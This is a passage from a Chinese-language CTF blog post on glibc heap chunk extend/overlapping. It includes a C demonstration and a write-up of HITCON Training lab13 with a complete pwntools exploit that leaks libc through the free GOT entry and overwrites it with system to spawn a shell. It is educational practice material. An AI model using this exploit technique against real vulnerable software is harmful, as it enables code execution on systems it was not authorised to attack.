+<h3 id="基本示例-5：通过-extend-前向-overlapping"><a href="#基本示例-5：通过-extend-前向-overlapping" class="headerlink" title="基本示例 5：通过 extend 前向 overlapping"></a>基本示例 5：通过 extend 前向 overlapping</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//防止与top合并</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;<span class="hljs-comment">//修改pre_inuse域，prev_inuse</span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;<span class="hljs-comment">//修改pre_size域，prev_size</span><br>    <span class="hljs-built_in">free</span>(ptr4);<span class="hljs-comment">//unlink进行前向extend</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);<span class="hljs-comment">//占位块</span><br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里例子调试一直出不来堆信息，就文字描述一下：</p>
+<p>先布置好 5 个堆块，然后释放 ptr1 进入到 unsortedbin 。修改 ptr4 的 prev_inuse 为 0 标记前一个堆块释放（空闲）；修改 ptr4 的 prev_size 为 ptr1+ptr2+ptr3 。释放 ptr4 会触发回收机制，也就是合并物理相邻的堆，用到的操作是 unlink ，就将 ptr1~4 当做一个堆块放入 unsortedbin。</p>
+<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="HITCON-Training-lab13"><a href="#HITCON-Training-lab13" class="headerlink" title="HITCON Training lab13"></a>HITCON Training lab13</h3><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13">题目链接</a></p>
+<h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bahs"># zer0ptr @ DESKTOP-FHEMUHT in ~/Pwn-Research/Heap-overflow-basic/Chunk_extend_overlapping/HITCON_Training_lab13 [15:58:02]<br>$ checksec heapcreator<br>[*] &#x27;/home/zer0ptr/Pwn-Research/Heap-overflow-basic/Chunk_extend_overlapping/HITCON_Training_lab13/heapcreator&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+
+
+<p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。</p>
+<h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下</p>
+<ol>
+<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
+<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 off by one 的漏洞</strong>。</li>
+<li>展示堆，输出指定索引堆的大小以及内容。</li>
+<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
+</ol>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>基本利用思路如下</p>
+<ol>
+<li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
+<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Heap : &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;heap:&quot;</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;heap :&quot;</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br><br><span class="hljs-comment"># off-by-one</span><br>create(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># 0</span><br>create(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># 1</span><br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + <span class="hljs-string">b&quot;\x41&quot;</span>)<br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc</span><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>create(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0x30</span>) + p64(free_got))<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Content : &quot;</span>)<br><br>free_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;free_addr:&quot;</span> + <span class="hljs-built_in">hex</span>(free_addr))<br>libc_base = free_addr - libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br>log.info(<span class="hljs-string">&quot;libc_base:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-string">&quot;system:&quot;</span> + <span class="hljs-built_in">hex</span>(system))<br><br>edit(<span class="hljs-number">1</span>, p64(system))<br><span class="hljs-comment"># gdb.attach(p)</span><br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><p>CTF-Wiki</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/#5extendoverlapping">Chunk Extend and Overlapping</a></li>
+</ul>
+</li>
+<li><p>CSDN</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/108320408">好好说话之Chunk Extend&#x2F;Overlapping</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43921239/article/details/107841328">Chunk Extend&#x2F;Overlapping | 堆拓展、重叠</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677731/article/details/107914807">buuctf hitcontraining_heapcreator HITCON Trainging lab13</a></li>
+</ul>
+</li>
+<li><p>知乎</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/61691650">堆利用之 chunk overlapping</a></li>
+</ul>
+</li>
+<li><p>博客园</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/WangAoBo/p/hitconTraining_wp.html#_label12">M4x@10.0.0.55</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Pocon/articles/19529104">PWN-extend overlapping</a></li>
+</ul>
+</li>
+<li><p>Blogs</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://yun1ian.github.io/2024/10/28/Overlapping/">hunk Extend and Overlapping（堆重叠）</a></li>
+<li><a target="_blank" rel="noopener" href="https://pidanxu.github.io/2019/02/27/hitcon-training-lab13/index.html">hitcon training lab13</a></li>
+<li><a target="_blank" rel="noopener" href="https://zh-closure.github.io/2022/03/03/Extend-and-Overlapping/#2%E3%80%81%E5%AF%B9inuse%E7%9A%84smallbin%E8%BF%9B%E8%A1%8Cextend">chunk extend overlapping</a></li>
+</ul>
+</li>
+<li><p>看雪</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-247110-1.htm">HITCON Trainging lab13 heapcreator</a></li>
+</ul>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" class="print-no-link">#堆溢出</a>
+      
+        <a href="/tags/Heap/" class="print-no-link">#Heap</a>
+      
+        <a href="/tags/Chunk-Extend-and-Overlapping/" class="print-no-link">#Chunk Extend and Overlapping</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Chunk Extend and Overlapping</div>
+      <div>https://hanashigure.github.io/2026/02/09/chunk-extend-overlapping/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>花時雨</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/02/11/heap-ptmalloc2-unlink/" title="Unlink学习记录">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Unlink学习记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/07/offbyone/" title="offbyone学习记录">
+                        <span class="hidden-mobile">offbyone学习记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/love.js"></script>
+<script src="/js/sakura.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
